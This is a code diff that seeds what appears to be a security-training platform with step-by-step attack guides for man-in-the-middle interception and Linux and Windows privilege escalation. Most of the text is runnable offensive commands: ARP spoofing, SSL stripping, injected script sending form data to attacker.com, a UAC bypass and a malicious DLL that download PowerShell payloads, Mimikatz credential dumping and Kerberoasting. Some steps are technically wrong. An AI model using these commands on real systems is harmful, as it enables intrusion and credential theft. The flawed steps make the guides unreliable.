@@ -673,8 +673,747 @@ Network reconnaissance gathers information about target systems. Always use with
             db.session.commit()
             print("[OK] Updated: Network Reconnaissance")
 
+        # Man-in-the-Middle Attack
+        mitm = Challenge.query.filter_by(name='Man-in-the-Middle Attack').first()
+        if mitm:
+            mitm.how_to_execute = """
+# Man-in-the-Middle (MITM) Attack - Complete Execution Guide
+
+## Prerequisites
+- Kali Linux or Linux machine
+- Network access to target
+- Tools: arpspoof, tcpdump, mitmproxy, ettercap
+- Target network: 192.168.1.0/24
+
+## Complete Execution Steps
+
+### Step 1: Enable IP Forwarding
+1. Open terminal and enable packet forwarding:
+```bash
+sudo sysctl -w net.ipv4.ip_forward=1
+```
+
+2. Verify it's enabled:
+```bash
+cat /proc/sys/net/ipv4/ip_forward
+# Should output: 1
+```
+
+### Step 2: Identify Target and Gateway
+1. Find your gateway:
+```bash
+route -n
+# Gateway is usually 192.168.1.1
+```
+
+2. Find target IP:
+```bash
+arp-scan -l
+# Or: nmap -sn 192.168.1.0/24
+```
+
+3. Note: Gateway IP (e.g., 192.168.1.1) and Target IP (e.g., 192.168.1.100)
+
+### Step 3: ARP Spoofing - Tell Target We're Gateway
+1. Spoof ARP packets to target:
+```bash
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+```
+
+This tells the target that we (attacker) are the gateway.
+
+### Step 4: ARP Spoofing - Tell Gateway We're Target
+1. In another terminal, spoof gateway:
+```bash
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+```
+
+This tells the gateway that we (attacker) are the target.
+
+**Now traffic flows: Target → Attacker → Gateway**
+
+### Step 5: Capture Traffic with Tcpdump
+1. In a third terminal, capture traffic:
+```bash
+sudo tcpdump -i eth0 -n 'tcp port 80 or tcp port 443 or tcp port 21'
+```
+
+2. This captures HTTP, HTTPS, and FTP traffic
+3. Look for login credentials in HTTP requests
+
+### Step 6: Using Mitmproxy for HTTP Interception
+1. Install mitmproxy:
+```bash
+sudo apt update && sudo apt install mitmproxy -y
+```
+
+2. Set up iptables to redirect traffic to mitmproxy:
+```bash
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
+sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
+```
+
+3. Start mitmproxy:
+```bash
+mitmproxy -p 8080
+```
+
+4. Access mitmproxy at http://localhost:8080
+5. View all HTTP requests intercepted
+
+### Step 7: Extract Credentials from HTTP
+1. With mitmproxy running, when target visits a login page:
+2. Look for POST requests with credentials
+3. Example: `POST /login` with `username=admin&password=secret`
+4. Credentials are captured in plaintext
+
+### Step 8: SSL/HTTPS Stripping
+1. Use sslstrip to downgrade HTTPS to HTTP:
+```bash
+sudo apt install sslstrip -y
+```
+
+2. Set up iptables:
+```bash
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+```
+
+3. Start sslstrip:
+```bash
+sslstrip -l 8080
+```
+
+4. Now HTTPS connections become HTTP (credentials visible)
+
+### Step 9: DNS Spoofing
+1. Modify hosts file to redirect domains:
+```bash
+sudo nano /etc/hosts
+```
+
+2. Add line:
+```
+192.168.1.100 example.com
+```
+
+3. Save and exit (Ctrl+X, Y, Enter)
+4. Now when target visits example.com, they see your server
+
+### Step 10: Session Hijacking
+1. Capture cookies with tcpdump:
+```bash
+sudo tcpdump -i eth0 -n -A 'tcp port 80' | grep -i 'cookie'
+```
+
+2. Extract JSESSIONID or session token
+3. Use in your browser's developer tools to impersonate user
+
+### Step 11: Packet Injection with Ettercap
+1. Start Ettercap:
+```bash
+sudo ettercap -G
+```
+
+2. Select network interface (eth0)
+3. Start sniffing
+4. Activate ARP spoofing
+5. Monitor traffic and inject commands
+
+### Step 12: DNS Tunneling
+1. Create DNS query to exfiltrate data:
+```bash
+nslookup exfildata.192.168.1.100
+```
+
+2. DNS queries go through attacker's DNS server
+3. Server logs all queries for data extraction
+
+### Step 13: Man-in-the-Browser (MITB)
+1. Inject JavaScript during HTTP response:
+```javascript
+<script>
+// Monitor all form submissions
+document.addEventListener('submit', function(e) {
+    // Exfiltrate form data
+    fetch('http://attacker.com/log?data=' + new FormData(e.target));
+});
+</script>
+```
+
+### Step 14: Automated MITM Framework
+1. Use BeEF framework:
+```bash
+./beef
+```
+
+2. Inject BeEF hook into target:
+```html
+<script src="http://attacker_ip:3000/hook.js"></script>
+```
+
+3. Hooked browsers appear in BeEF console
+4. Execute commands on hooked browsers
+
+### Step 15: Clean Up
+1. Stop all attacks:
+```bash
+sudo arpspoof -c on
+sudo iptables -t nat -F
+sudo iptables -t nat -X
+```
+
+2. Disable IP forwarding:
+```bash
+sudo sysctl -w net.ipv4.ip_forward=0
+```
+
+## Real-World MITM Attack Scenarios
+
+### Scenario 1: Corporate Network
+- Position attacker between employee and router
+- Capture all HTTP logins, emails, instant messages
+- Extract credentials and sensitive data
+
+### Scenario 2: WiFi Hotspot
+- Run mitmproxy on WiFi access point
+- All users connecting through attacker
+- Full visibility of traffic
+
+## Prevention Methods
+- Use HTTPS (TLS/SSL)
+- Verify SSL certificates
+- Use VPN for public WiFi
+- Certificate pinning
+- Monitor ARP tables
+
+## Summary
+MITM attacks intercept communication between two parties. Always use encrypted connections and verify certificates.
+"""
+            db.session.commit()
+            print("[OK] Updated: Man-in-the-Middle Attack")
+
+        # Privilege Escalation
+        priv_esc = Challenge.query.filter_by(name='Privilege Escalation').first()
+        if priv_esc:
+            priv_esc.how_to_execute = """
+# Privilege Escalation - Complete Execution Guide
+
+## Prerequisites
+- Linux system with sudo
+- SSH access to vulnerable server
+- Basic Linux command knowledge
+- Tools: sudo, GTFOBins, kernel exploits
+
+## Complete Execution Steps
+
+### Step 1: Check Current User Privileges
+1. Open terminal and check current user:
+```bash
+whoami
+id
+```
+
+2. Check sudo permissions:
+```bash
+sudo -l
+```
+
+3. Look for NOPASSWD entries (can run without password)
+
+### Step 2: Explore SUDO Configuration
+1. View sudoers file:
+```bash
+cat /etc/sudoers
+```
+
+2. Look for:
+   - `%wheel` - All users in wheel group have sudo
+   - `NOPASSWD` - No password required
+   - Specific commands that don't need password
+
+### Step 3: Privilege Escalation via SUDO
+1. If user can run specific command with sudo:
+```bash
+sudo -l
+# Output might show:
+# User can run the following commands:
+#   (ALL) NOPASSWD: /usr/bin/nano
+```
+
+2. If nano doesn't require password:
+```bash
+sudo nano
+```
+
+3. Inside nano, press Ctrl+R, then Ctrl+X
+4. Type: `reset; sh 1>&0 2>&0`
+5. Press Enter to spawn root shell
+
+### Step 4: Exploit Shell Metacharacters in SUDO
+1. If user can run specific command with sudo:
+```bash
+sudo /usr/bin/find / -name flag
+```
+
+2. Inside find, use shell escape:
+```bash
+sudo find /root -exec /bin/sh \;
+```
+
+3. You now have root shell
+
+### Step 5: Check SUID Binaries
+1. Find programs with SUID bit set:
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+2. These run as owner (often root)
+3. Look for unusual binaries
+
+### Step 6: Exploit Vulnerable SUID Binary
+1. Common vulnerable binary: cp (copy)
+```bash
+find / -name cp -perm -4000 2>/dev/null
+```
+
+2. Copy /bin/sh to /tmp:
+```bash
+cp /bin/sh /tmp/mysh
+```
+
+3. Since cp is SUID root, /tmp/mysh is owned by root
+
+4. Make it a SUID binary:
+```bash
+chmod 4755 /tmp/mysh
+/tmp/mysh
+```
+
+5. Now you have root shell
+
+### Step 7: Check World-Writable Directories
+1. Find writable directories:
+```bash
+find /usr/bin -writable 2>/dev/null
+```
+
+2. If you can write to /usr/bin, create malicious script:
+```bash
+echo '#!/bin/bash' > /usr/bin/malicious
+echo '/bin/sh' >> /usr/bin/malicious
+chmod +x /usr/bin/malicious
+```
+
+3. If anything calls this script, it runs as owner
+
+### Step 8: Environment Variable Abuse
+1. Check for scripts using relative paths:
+```bash
+find / -type f -executable 2>/dev/null | xargs grep -l 'grep\|ls\|cat\|find'
+```
+
+2. If script uses `grep` without full path:
+   - Create malicious grep in your PATH:
+```bash
+mkdir /tmp/malicious
+echo '#!/bin/bash' > /tmp/malicious/grep
+echo '/bin/sh' >> /tmp/malicious/grep
+chmod +x /tmp/malicious/grep
+export PATH=/tmp/malicious:$PATH
+```
+
+3. When script runs grep, it uses your malicious version
+
+### Step 9: Check for Kernel Exploits
+1. Get kernel version:
+```bash
+uname -a
+```
+
+2. Search for exploits:
+```bash
+searchsploit kernel 5.4
+```
+
+3. Or check online databases (CVE details)
+
+4. Download and compile exploit:
+```bash
+gcc -o exploit exploit.c
+./exploit
+```
+
+### Step 10: Exploit Weak File Permissions
+1. Check sensitive files:
+```bash
+ls -la /etc/shadow
+ls -la /root/.ssh/id_rsa
+```
+
+2. If world-readable:
+```bash
+cat /root/.ssh/id_rsa
+```
+
+3. Use SSH key for root access:
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa root@localhost
+```
+
+### Step 11: Cron Job Manipulation
+1. Check cron jobs:
+```bash
+crontab -l
+cat /etc/crontab
+```
+
+2. If cron runs script you can modify:
+```bash
+ls -la /home/*/script.sh
+```
+
+3. If writable:
+```bash
+echo '/bin/sh' >> /home/user/script.sh
+```
+
+4. Wait for cron to execute (runs as owner, usually root)
+
+### Step 12: Check Docker Groups
+1. If user is in docker group:
+```bash
+id | grep docker
+```
+
+2. Docker allows full system access:
+```bash
+docker run -v /:/mnt -it alpine
+cd /mnt
+cat root/.ssh/id_rsa
+```
+
+### Step 13: Systemd Service Manipulation
+1. Check user services:
+```bash
+systemctl list-unit-files | grep user
+```
+
+2. Edit service file:
+```bash
+nano ~/.config/systemd/user/myservice.service
+```
+
+3. Add malicious command:
+```ini
+[Service]
+ExecStart=/bin/sh -c "whoami > /tmp/owner"
+```
+
+4. Enable and start:
+```bash
+systemctl --user enable myservice.service
+systemctl --user start myservice.service
+```
+
+### Step 14: Capability-Based Escalation
+1. Check for capabilities:
+```bash
+getcap -r / 2>/dev/null
+```
+
+2. Capabilities like CAP_SYS_ADMIN allow escalation:
+```bash
+# If python has CAP_SYS_ADMIN
+python3 -c 'import os; os.execl("/bin/sh", "sh")'
+```
+
+### Step 15: Full Automated Privilege Escalation Script
+1. Use LinEnum:
+```bash
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
+
+2. Or use PEAS:
+```bash
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | bash
+```
+
+## Real-World Privilege Escalation
+
+### Scenario: Compromised Web Server
+1. Initial access as www-data user
+2. Find: `sudo -l` shows /usr/bin/nano allowed
+3. Use nano escape to get root shell
+4. Now have full system access
+
+## Prevention Methods
+- Remove SUID bits from unnecessary binaries
+- Keep kernel updated
+- Restrict sudo permissions
+- Monitor cron jobs
+- Use AppArmor or SELinux
+
+## Summary
+Privilege escalation exploits misconfigurations to gain root access. Always audit and minimize privileges.
+"""
+            db.session.commit()
+            print("[OK] Updated: Privilege Escalation")
+
+        # Windows Privilege Escalation
+        win_priv_esc = Challenge.query.filter_by(name='Windows Privilege Escalation').first()
+        if win_priv_esc:
+            win_priv_esc.how_to_execute = """
+# Windows Privilege Escalation - Complete Execution Guide
+
+## Prerequisites
+- Windows system (7, 10, Server 2016+)
+- Command Prompt or PowerShell
+- Tools: mimikatz, PowerUp, UACME
+
+## Complete Execution Steps
+
+### Step 1: Check Current Privileges
+1. Open Command Prompt as current user
+2. Run:
+```cmd
+whoami
+whoami /priv
+```
+
+3. Check if part of admin group:
+```cmd
+net localgroup administrators
+```
+
+### Step 2: Check UAC Status
+1. View User Account Control settings:
+```cmd
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+```
+
+2. If EnableLUA = 1, UAC is enabled (needs bypass)
+
+### Step 3: Bypass UAC with Shell Fodder
+1. UAC allows certain programs to run elevated
+2. Use Windows built-in programs:
+```cmd
+eventvwr.exe
+fodhelper.exe
+sdclt.exe
+```
+
+3. Example - fodhelper bypass:
+```cmd
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd /c powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" /f
+fodhelper.exe
+```
+
+### Step 4: Token Impersonation
+1. If running with SeImpersonatePrivilege:
+```cmd
+whoami /priv | find "SeImpersonate"
+```
+
+2. Use Rotten Potato/Juicy Potato to impersonate SYSTEM:
+```cmd
+.\JuicyPotato.exe -l 1337 -p C:\path\to\shell.exe -t t -c {CLSID}
+```
+
+3. Creates reverse shell as SYSTEM user
+
+### Step 5: Check Installed Programs for Vulnerabilities
+1. List installed programs:
+```cmd
+wmic product list
+Get-Package | Select-Object Name, Version (PowerShell)
+```
+
+2. Check for known vulnerable software
+
+### Step 6: Unquoted Service Paths
+1. Find services with unquoted paths:
+```cmd
+wmic service list brief
+```
+
+2. Check each service:
+```cmd
+sc query ServiceName
+sc qc ServiceName
+```
+
+3. Look for paths like: C:\Program Files\Program Name\app.exe
+
+4. Exploit: Create malicious executable at: C:\Program.exe
+5. When service restarts, your executable runs as SYSTEM
+
+### Step 7: Weak Service Permissions
+1. Check service DACL:
+```cmd
+icacls "C:\Program Files\VulnerableService"
+```
+
+2. If you have modify permissions, replace executable:
+```cmd
+copy malicious.exe "C:\Program Files\VulnerableService\app.exe"
+net start VulnerableService
+```
+
+### Step 8: Scheduled Task Exploitation
+1. List scheduled tasks:
+```cmd
+tasklist /v
+Get-ScheduledTask | Get-ScheduledTaskInfo (PowerShell)
+```
+
+2. Check task properties:
+```cmd
+schtasks /query /tn "Task Name" /v
+```
+
+3. If task runs with SYSTEM and you control the executable:
+```cmd
+taskkill /TN "Task Name" /F
+copy malicious.exe "path\to\task\executable.exe"
+```
+
+### Step 9: Registry Run Key Escalation
+1. Check Run keys:
+```cmd
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+```
+
+2. If you can modify these (and admin runs them at logon):
+```cmd
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Malware /d "C:\path\shell.exe"
+```
+
+### Step 10: DLL Hijacking
+1. Find application that loads DLLs:
+```cmd
+Process Monitor: Search for "NAME NOT FOUND" DLL loads
+```
+
+2. Create malicious DLL with same name:
+```c
+// malicious.dll
+#include <windows.h>
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    system("cmd /c powershell IEX(New-Object Net.WebClient).DownloadString(...)");
+    return TRUE;
+}
+```
+
+3. Place in directory application searches:
+```cmd
+copy malicious.dll "C:\Application\Folder\required.dll"
+```
+
+### Step 11: Credential Harvesting with Mimikatz
+1. Download Mimikatz:
+```cmd
+https://github.com/gentilkiwi/mimikatz/releases
+```
+
+2. Run Mimikatz:
+```cmd
+.\mimikatz.exe
+```
+
+3. Inside Mimikatz:
+```
+privilege::debug
+token::elevate
+lsadump::lsa /patch
+```
+
+4. This extracts hashed passwords from LSASS
+
+### Step 12: Living off the Land Binaries (LOLBAS)
+1. Use built-in Windows tools:
+```cmd
+mshta.exe
+wmic.exe
+powershell.exe
+regsvr32.exe
+rundll32.exe
+```
+
+2. Example - regsvr32 for reverse shell:
+```cmd
+regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
+```
+
+### Step 13: PowerShell Privilege Escalation
+1. Check if you can run PS as admin:
+```cmd
+powershell -Command "Test-Path C:\Windows\System32\config\SAM"
+```
+
+2. Use PowerUp to find vulnerabilities:
+```powershell
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+3. Execute recommended privilege escalation
+
+### Step 14: Kerberoasting
+1. Extract Service Principal Names (SPNs):
+```cmd
+GetUserSPNs.py -request domain.com/username:password
+```
+
+2. Crack extracted hashes offline:
+```cmd
+hashcat -m 13100 hashes.txt wordlist.txt
+```
+
+### Step 15: Custom Exploit Development
+1. Identify Windows version:
+```cmd
+systeminfo | find "OS"
+wmic os get caption, version
+```
+
+2. Search for CVE exploits:
+```cmd
+https://www.exploit-db.com/
+```
+
+3. Download and compile exploit:
+```cmd
+cd Downloads
+.\exploit.exe
+```
+
+## Real-World Windows Privilege Escalation
+
+### Scenario: Compromised User Account
+1. Initial access as regular user
+2. Check: `whoami /priv` - has SeImpersonate
+3. Use Juicy Potato to get SYSTEM
+4. Now have full admin access
+
+## Prevention Methods
+- Keep Windows updated
+- Disable unnecessary services
+- Use AppLocker
+- Enable Code Integrity
+- Monitor privilege escalation attempts
+
+## Summary
+Windows privilege escalation exploits misconfigurations. Regular patching and auditing are essential.
+"""
+            db.session.commit()
+            print("[OK] Updated: Windows Privilege Escalation")
+
         print("\n" + "="*50)
-        print("All challenges updated with comprehensive guides!")
+        print("All 6 challenges updated with comprehensive guides!")
         print("="*50)
         print("\nGuides include:")
         print("[OK] Step-by-step instructions")
